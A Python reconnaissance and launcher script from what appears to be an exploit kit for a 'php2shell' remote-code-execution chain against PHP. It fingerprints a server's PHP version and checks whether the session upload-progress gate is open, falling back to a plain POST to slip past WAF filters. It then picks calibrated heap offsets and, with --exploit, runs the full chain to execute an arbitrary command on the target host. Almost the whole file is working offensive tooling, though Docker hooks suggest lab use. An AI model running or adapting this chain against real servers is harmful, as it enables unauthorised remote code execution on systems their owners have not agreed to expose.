#!/usr/bin/env python3
"""Safe pre-flight profiler for the php2shell pure-HTTP chain.

Sends only ordinary requests -- no chunked heap shaping, no OOM, no
worker kill:

  passive : GET/OPTIONS header inspection plus the
            `?=PHPB8B5F2A0-...` expose_php credits probe (version
            string in the reply body)
  traffic : one small multipart POST (Content-Length, ~240B body)
            carrying PHP_SESSION_UPLOAD_PROGRESS.  With
            session.upload_progress.enabled=On, rfc1867_post_handler
            starts the session and the reply carries Set-Cookie --
            the exact gate stage A1 needs.  The body stays far below
            post_max_size, so nothing OOMs.

usage:
  python3 tools/recon.py --port 18110
  python3 exploit.py recon --port 18110
  python3 tools/recon.py --port 18110 --container p2s-pure-18110

exit: 0 when the target matches the calibrated profile, 1 otherwise.
"""
import argparse
import os
import re
import shutil
import socket
import ssl
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import profiles as _profiles_mod
from profiles import find as find_profile
from profiles import summarize

_PROFILES = _profiles_mod.load_all()

TARGET_VERSION = "8.4.26"
CREDITS_PROBE = "=PHPB8B5F2A0-3C92-11d2-A769-00AA001ACF42"
PROGRESS_FIELD = b"PHP_SESSION_UPLOAD_PROGRESS"
BOUNDARY = b"p2srecon"


def http_roundtrip(host: str, port: int, method: str, path: str,
                   headers: dict | None = None, body: bytes = b"",
                   timeout: float = 6.0, use_tls: bool = False):
    scheme = "https" if use_tls else "http"
    req = "%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n" % (
        method, path, host)
    for key, val in (headers or {}).items():
        req += "%s: %s\r\n" % (key, val)
    raw = (req + "\r\n").encode("latin1") + body
    resp = bytearray()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.settimeout(timeout)
        try:
            s.sendall(raw)
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp.extend(chunk)
        finally:
            s.close()
    except socket.gaierror as exc:
        return "", {}, b"", "dns_error: cannot resolve %r (%s)" % (
            host, exc)
    except OSError as exc:
        return "", {}, b"", "connect_error: %r" % (exc,)
    head, _, payload = bytes(resp).partition(b"\r\n\r\n")
    lines = head.decode("latin1", "replace").split("\r\n")
    hdrs = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            hdrs[k.strip().lower()] = v.strip()
    if "chunked" in hdrs.get("transfer-encoding", ""):
        payload = dechunk(payload)
    return (lines[0] if lines else ""), hdrs, payload, ""


def follow_probe(host: str, port: int, method: str, path: str,
                  timeout: float, use_tls: bool, hops: int = 5,
                  headers: dict | None = None, body: bytes = b""):
    """Round trip, following 3xx redirects up to `hops` times.

    Returns (status, hdrs, payload, err, tls, final_host,
    final_port, final_path).  Relative Locations resolve
    against the current path.
    """
    cur_host, cur_port, cur_path, cur_tls = host, port, path, use_tls
    seen = set()
    for _ in range(hops + 1):
        status, hdrs, payload, err = http_roundtrip(
            cur_host, cur_port, method, cur_path,
            headers=headers, body=body,
            timeout=timeout, use_tls=cur_tls)
        if err:
            return status, hdrs, payload, err, cur_tls, cur_host, cur_port, cur_path
        code = status.split(" ", 2)[1] if " " in status else ""
        if code not in ("301", "302", "303", "307", "308"):
            return (status, hdrs, payload, "", cur_tls,
                    cur_host, cur_port, cur_path)
        loc = hdrs.get("location", "")
        if not loc:
            return (status, hdrs, payload, "", cur_tls,
                    cur_host, cur_port, cur_path)
        if loc.startswith("https://"):
            rest = loc[len("https://"):]
            cur_tls = True
        elif loc.startswith("http://"):
            rest = loc[len("http://"):]
            cur_tls = False
        elif loc.startswith("/"):
            cur_path = loc
            continue
        else:
            base = cur_path.rsplit("/", 1)[0]
            cur_path = base + "/" + loc
            continue
        rest = rest.split("/", 1)
        authority = rest[0]
        cur_path = "/" + rest[1] if len(rest) > 1 else "/"
        if ":" in authority:
            h, _, p = authority.rpartition(":")
            if p.isdigit():
                cur_host, cur_port = h, int(p)
            else:
                cur_host = authority
        else:
            cur_host = authority
            cur_port = 443 if cur_tls else 80
        if (cur_host, cur_port, cur_path, cur_tls) in seen:
            break
        seen.add((cur_host, cur_port, cur_path, cur_tls))
    return (status, hdrs, payload, "too many redirects",
            cur_tls, cur_host, cur_port, cur_path)


def dechunk(payload: bytes) -> bytes:
    out = bytearray()
    i = 0
    while i < len(payload):
        j = payload.find(b"\r\n", i)
        if j < 0:
            out += payload[i:]
            break
        try:
            size = int(payload[i:j].split(b";")[0], 16)
        except ValueError:
            out += payload[i:]
            break
        if size == 0:
            break
        out += payload[j + 2:j + 2 + size]
        i = j + 2 + size + 2
    return bytes(out)


def probe_passive(host: str, port: int, path: str,
                  timeout: float,
                  use_tls: bool = False) -> dict:
    info: dict = {}
    status, hdrs, _, err, tls, fh, fp_, fpath = follow_probe(
        host, port, "GET", path, timeout, use_tls)
    info["get_status"] = status or err
    info["final_url"] = "http%s://%s%s" % (
        "s" if tls else "", fh, fpath)
    info["server"] = hdrs.get("server", "")
    info["x_powered_by"] = hdrs.get("x-powered-by", "")
    _, _, p2, _, _, _, _, _ = follow_probe(
        host, port, "GET", path + "?" + CREDITS_PROBE,
        timeout, use_tls)
    m = re.search(rb"PHP Version ([0-9]+\.[0-9]+\.[0-9]+)", p2)
    info["expose_php"] = bool(m)
    info["probe_version"] = m.group(1).decode() if m else ""
    m2 = re.search(r"PHP/([0-9]+\.[0-9]+\.[0-9]+)",
                   info["x_powered_by"])
    info["header_version"] = m2.group(1) if m2 else ""
    return info


def probe_progress_gate(host: str, port: int, path: str,
                        timeout: float,
                        use_tls: bool = False) -> dict:
    body = (b"--" + BOUNDARY + b"\r\n"
            b"Content-Disposition: form-data; name=\"" +
            PROGRESS_FIELD + b"\"\r\n\r\n"
            b"1\r\n"
            b"--" + BOUNDARY + b"--\r\n")
    headers = {
        "Content-Type": "multipart/form-data; boundary=" +
                        BOUNDARY.decode(),
        "Content-Length": str(len(body)),
    }
    status, hdrs, _, err, tls, fh, fp_, fpath = follow_probe(
        host, port, "POST", path, timeout, use_tls,
        headers=headers, body=body)
    return {
        "status": status or err,
        "bytes": len(body),
        "set_cookie": "set-cookie" in hdrs,
        "cookie": hdrs.get("set-cookie", ""),
        "err": err,
        "final_url": "http%s://%s%s" % (
            "s" if tls else "", fh, fpath),
        "_port": port,
        "_path": path,
        "_tls": use_tls,
    }


def probe_progress_plain(host: str, port: int, path: str,
                           timeout: float,
                           use_tls: bool = False) -> dict:
    """urlencoded fallback when multipart is blocked:
    some WAFs / LSAPI filters key on the multipart
    content-type, not on the progress field itself.
    rfc1867_post_handler still runs for urlencoded
    POSTs, so the session gate is probeable."""
    body = PROGRESS_FIELD + b"=1"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(body)),
    }
    status, hdrs, _, err, tls, fh, fp_, fpath = follow_probe(
        host, port, "POST", path, timeout, use_tls,
        headers=headers, body=body)
    return {
        "status": status or err,
        "set_cookie": "set-cookie" in hdrs,
        "cookie": hdrs.get("set-cookie", ""),
        "err": err,
    }


def probe_container(name: str, docker: str) -> dict:
    info: dict = {"available": False}
    exe = shutil.which("docker") or docker
    try:
        r = subprocess.run(exe.split() + ["info"], capture_output=True,
                           stdin=subprocess.DEVNULL, timeout=10)
        if r.returncode != 0:
            info["note"] = "docker not usable"
            return info
    except (OSError, subprocess.TimeoutExpired):
        info["note"] = "docker not available"
        return info
    info["available"] = True
    php = ("echo PHP_VERSION,',',"
           "ini_get('session.upload_progress.enabled'),',',"
           "ini_get('session.use_strict_mode'),',',"
           "ini_get('memory_limit'),',',"
           "ini_get('session.use_cookies');")
    try:
        r = subprocess.run(exe.split() + ["exec", name, "php", "-r", php],
                           capture_output=True, text=True, timeout=30,
                           stdin=subprocess.DEVNULL)
        parts = r.stdout.strip().split(",")
        if len(parts) == 5:
            (info["php_version"], info["upload_progress"],
             info["strict_mode"], info["memory_limit"],
             info["use_cookies"]) = parts
        r2 = subprocess.run(exe.split() + ["exec", name, "apache2ctl", "-V"],
                            capture_output=True, text=True, timeout=30,
                            stdin=subprocess.DEVNULL)
        m = re.search(r"Server MPM:\s*(\S+)", r2.stdout)
        if m:
            info["mpm"] = m.group(1)
    except (OSError, subprocess.TimeoutExpired) as exc:
        info["note"] = "exec failed: %r" % (exc,)
    return info


def normalize_host(raw: str) -> str:
    """Accept a bare host, an IP, or a URL (scheme/path stripped).

    `https://example.com:80/x` and `example.com` both yield
    `example.com`; a URL's port is ignored -- use --port.
    """
    s = raw.strip()
    if "://" in s:
        s = s.split("://", 1)[1]
    s = s.split("/", 1)[0]
    s = s.split("?", 1)[0]
    s = s.split("#", 1)[0]
    if ":" in s:
        h, _, p = s.rpartition(":")
        if p.isdigit():
            s = h
    return s


# PHP versions with known-unfixed PHP2Shell branches
# (CVE-2026-109618/109619).  A version at or above the
# fix is patched; below it, the branch is affected.
FIX_VERSIONS = {
    (7, 4): (7, 4, 99),   # 7.4 branch: no fix released
    (8, 0): (8, 0, 99),   # 8.0 branch: no fix released
    (8, 1): (8, 1, 99),   # 8.1 branch: no fix released
    (8, 2): (8, 2, 35),
    (8, 3): (8, 3, 36),
    (8, 4): (8, 4, 27),
    (8, 5): (8, 5, 12),
}


def parse_ver(v: str) -> tuple[int, ...] | None:
    try:
        return tuple(int(x) for x in v.split(".")[:3])
    except ValueError:
        return None


def exposure(ver: str) -> str:
    """Affected / patched / unknown for the PHP2shell
    CVEs, from the version alone."""
    pv = parse_ver(ver)
    if not pv:
        return "unknown (unparseable version)"
    fix = FIX_VERSIONS.get(pv[:2])
    if fix is None:
        return "unknown branch (not in the advisory map)"
    if pv < fix:
        if fix[2] == 99:
            return ("AFFECTED (PHP %d.%d branch has no "
                    "upstream fix for CVE-2026-109618/"
                    "109619)" % pv[:2])
        return ("AFFECTED (fixed in PHP %d.%d.%d)"
                % fix)
    return "PATCHED (>= %d.%d.%d)" % fix


def build_verdict(passive: dict, gate: dict, cont: dict,
                  host: str = "127.0.0.1"):
    lines: list[str] = []
    blockers: list[str] = []

    version = (cont.get("php_version") or passive.get("probe_version")
               or passive.get("header_version") or "")
    if version:
        prof = find_profile(version, None, _PROFILES)
        if prof is not None:
            lines.append("PHP %s: profile %s - %s" % (
                version, prof["name"],
                "RCE-verified calibration" if prof.get(
                    "rce_verified") else
                    "catalog row, NOT RCE-verified yet"))
            lines.append("  offsets: %s" % summarize(prof))
        else:
            blockers.append("PHP %s: no profile in "
                            "profiles/ (offsets zif_system / "
                            "zval_ptr_dtor / S / hsv need "
                            "calibration for this build)" % version)
        lines.append("  exposure: %s" % exposure(version))

    if cont.get("available"):
        lines.append("[docker] php: version=%s upload_progress=%s "
                     "strict_mode=%s memory_limit=%s use_cookies=%s" % (
                         cont.get("php_version", "?"),
                         cont.get("upload_progress", "?"),
                         cont.get("strict_mode", "?"),
                         cont.get("memory_limit", "?"),
                         cont.get("use_cookies", "?")))
        if cont.get("upload_progress") == "0":
            blockers.append("session.upload_progress.enabled=0 in the "
                            "container - A1 cannot start")
        if cont.get("strict_mode") == "1":
            blockers.append("session.use_strict_mode=1 - may reject the "
                            "stale id B1 relies on")
        if cont.get("mpm"):
            lines.append("[docker] Server MPM: %s" % cont["mpm"])
        else:
            lines.append("[docker] Server MPM: not reported (chain is "
                         "calibrated for prefork mod_php NTS)")
    else:
        lines.append("[docker] %s - MPM/SAPI/ini unverifiable from "
                     "outside; verify prefork + mod_php + 128M on the "
                     "host" % cont.get("note", "unknown"))

    if gate["err"]:
        blockers.append("safe progress POST failed: %s" % gate["err"])
        if "dns_error" in gate["err"]:
            blockers.append("--host does not resolve; pass an IP "
                            "or resolvable hostname (not the "
                            "literal placeholder TARGET)")
    elif gate["set_cookie"]:
        lines.append("upload_progress gate: ON - progress POST "
                     "started a session (Set-Cookie: %s)"
                     % gate["cookie"])
        if cont.get("use_cookies") == "0":
            blockers.append("session.use_cookies=0 - the chain "
                            "needs the id cookie round-trip")
    else:
        parts = gate["status"].split(" ", 2)
        gs = parts[1] if len(parts) > 1 else ""
        if gs in ("403", "404", "405"):
            # multipart blocked before PHP; retry with a
            # urlencoded plain POST -- some WAFs / LSAPI
            # filters key on the multipart content-type
            plain = probe_progress_plain(
                host, gate.get("_port", 0),
                gate.get("_path", "/index.php"),
                6.0, gate.get("_tls", False))
            if plain["set_cookie"]:
                lines.append("upload_progress gate: ON - "
                             "plain POST started a session "
                             "(multipart was %s; Set-Cookie: "
                             "%s)" % (gs, plain["cookie"]))
            elif plain["status"].startswith("HTTP/1.1 2") or \
                    plain["status"].startswith("HTTP/2 2"):
                blockers.append("multipart POST got %s "
                                "(blocked before PHP), but "
                                "the plain-POST fallback "
                                "reached PHP (2xx) with no "
                                "Set-Cookie - "
                                "session.upload_progress is "
                                "off or use_cookies=0 on "
                                "this host; A1 cannot start"
                                % gs)
            else:
                blockers.append("%s on the progress POST: "
                                "the request never reached "
                                "PHP (WAF/LSAPI blocked or "
                                "not a POST-accepting PHP "
                                "page); plain-POST fallback "
                                "also got %s - the gate "
                                "cannot be probed here "
                                "(point --host/--path at a "
                                "PHP page that accepts "
                                "multipart POSTs)"
                                % (gs, plain["status"]))

        elif gs.startswith("3"):
            blockers.append("%s redirect on the progress "
                            "POST even after following "
                            "to %s - the gate cannot be "
                            "probed here"
                            % (gs, gate.get("final_url",
                                               "?")))
        else:
            blockers.append("upload_progress gate: no "
                            "Set-Cookie after the "
                            "progress POST "
                            "(session.upload_progress."
                            "enabled=0 or "
                            "session.use_cookies=0) - "
                            "A1 cannot start")

    if blockers:
        lines.append("scope: OUT OF SCOPE / unverified")
    else:
        prof = find_profile(version, None, _PROFILES)
        if prof is not None and prof.get("rce_verified"):
            lines.append("scope: IN SCOPE - RCE-verified "
                         "profile %s (exploit.py recon "
                         "--exploit can run the chain)"
                         % prof["name"])
        elif prof is not None:
            lines.append("scope: profile found but NOT "
                         "RCE-verified (symbol offsets only; "
                         "calibrate S/hsv and stage params "
                         "in a container before use)")
        else:
            lines.append("scope: gate open, no profile "
                         "(unknown build)")
    for b in blockers:
        lines.append("  blocker: %s" % b)
    return lines, blockers


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Pre-flight profiler for the php2shell "
                    "pure-HTTP chain: passive probes plus one "
                    "small progress POST (no OOM, no heap "
                    "shaping), then profile selection. With "
                    "--exploit it runs the whole chain with "
                    "the matched profile's offsets and stage "
                    "params -- one command.")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=0)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--tls", action="store_true",
                    help="force HTTPS regardless of scheme/port")
    ap.add_argument("--container", default="",
                    help="docker container name for ini/MPM introspection")
    ap.add_argument("--docker", default="sudo docker")
    ap.add_argument("--timeout", type=float, default=6.0)
    ap.add_argument("--exploit", action="store_true",
                    help="after profiling, run the full chain "
                         "with the matched profile (needs an "
                         "RCE-verified row; refuses otherwise)")
    ap.add_argument("--force", action="store_true",
                    help="with --exploit, run even when the "
                         "profile is NOT RCE-verified (symbol "
                         "offsets only; S/hsv and stage params "
                         "are 8.4.26 placeholders -- likely to "
                         "fail or crash the worker)")
    ap.add_argument("--cmd", default="id>/out/p1",
                    help="command for --exploit to run in the "
                         "target")
    ap.add_argument("--retries", type=int, default=3,
                    help="chain attempts for --exploit")
    ap.add_argument("--restart", default="",
                    help="docker container to restart before each "
                         "--exploit attempt")
    args = ap.parse_args(argv)


    host = normalize_host(args.host)
    if not host:
        print("recon: --host %r is empty after stripping "
              "the URL scheme/path" % args.host)
        return 1
    # TLS decision:
    #   --tls                -> force HTTPS
    #   --host https://...   -> HTTPS on the default port
    #                             (443 unless --port given)
    #   --port 443           -> HTTPS (443 implies TLS)
    #   explicit --port      -> plain HTTP there first;
    #                             3xx redirects still switch
    #                             schemes via follow_probe
    default_port = args.port == 0
    use_tls = (args.tls
               or (args.host.startswith("https://")
                   and default_port)
               or (not default_port and args.port == 443))
    if default_port:
        args.port = 443 if use_tls else 18110
    if host != args.host:
        print("note: --host %r normalized to %r "
              "(scheme/path stripped)" % (args.host, host))
    print("== recon http%s://%s:%d%s ==" % (
        "s" if use_tls else "", host, args.port, args.path))

    passive = probe_passive(host, args.port, args.path,
                                  args.timeout, use_tls)
    print("  GET: %s | Server: %s | X-Powered-By: %s" % (
        passive["get_status"], passive["server"] or "-",
        passive["x_powered_by"] or "hidden"))
    print("  final URL: %s" % passive.get("final_url", "-"))
    if passive["probe_version"]:
        print("  expose_php probe: PHP/%s"
              % passive["probe_version"])
    else:
        print("  expose_php probe: no version string "
              "(expose_php off?)")

    gate = probe_progress_gate(host, args.port, args.path,
                                     args.timeout, use_tls)
    print("  safe progress POST (%dB, Content-Length): %s | "
          "Set-Cookie: %s" % (gate["bytes"], gate["status"],
                              "yes" if gate["set_cookie"] else "no"))
    print("  final URL: %s" % gate.get("final_url", "-"))

    cont = (probe_container(args.container, args.docker)
            if args.container else {"available": False,
                                    "note": "no --container given"})
    lines, blockers = build_verdict(passive, gate, cont,
                                      host=host)
    for ln in lines:
        print("  " + ln)

    if args.exploit:
        return run_exploit(host, args, passive, _PROFILES,
                                force=args.force)
    return 0 if not blockers else 1


def run_exploit(host, args, passive, profiles_list,
                  force: bool = False):
    """Run the full chain with the matched profile.

    Delegates to exploit.py's chain (cmd_run) so
    offsets and stage params come from the profile
    JSON.  Refuses anything but an RCE-verified row
    unless `force` is set.
    """
    version = (passive.get("probe_version")
               or passive.get("header_version") or "")
    if not version:
        print("exploit: no PHP version detected; "
              "cannot select a profile")
        return 1
    prof = find_profile(version, None, profiles_list)
    if prof is None:
        print("exploit: no profile for PHP %s in "
              "profiles/" % version)
        return 1
    if not prof.get("rce_verified"):
        if not force:
            print("exploit: profile %s is NOT "
                  "RCE-verified (symbol offsets only; "
                  "S/hsv and stage params need "
                  "in-container calibration) -- "
                  "refusing to run (--force to run "
                  "anyway)" % prof["name"])
            return 1
        print("exploit: WARNING -- profile %s is NOT "
              "RCE-verified; running with 8.4.26 "
              "placeholder S/hsv and stage params "
              "(--force); the chain will likely fail "
              "or crash the worker" % prof["name"])
    print("exploit: using profile %s" % prof["name"])
    sys.path.insert(0, os.path.dirname(
        os.path.dirname(os.path.abspath(__file__))))
    import exploit as exploit_mod
    return exploit_mod.cmd_run(
        host=host, port=args.port, path=args.path,
        use_tls=(args.tls or args.port == 443),
        cmd=args.cmd, profile=prof,
        retries=args.retries, restart=args.restart,
        docker=args.docker, timeout=args.timeout)


if __name__ == "__main__":
    raise SystemExit(main())
